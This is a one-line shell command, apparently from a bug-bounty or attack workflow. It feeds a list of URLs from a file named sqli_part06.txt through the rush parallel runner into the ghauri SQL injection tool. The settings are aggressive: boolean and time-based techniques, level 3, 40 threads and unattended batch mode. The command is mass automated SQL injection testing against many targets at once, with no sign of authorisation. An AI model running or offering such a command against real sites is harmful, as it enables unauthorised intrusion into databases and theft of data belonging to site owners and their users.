cat sqli_part06.txt | rush -k -j 8 'bash -c "ghauri --url \"{}\" --confirm --timeout 30 --threads 40 --level 3 --flush-session --fresh-queries --technique BT --batch"'
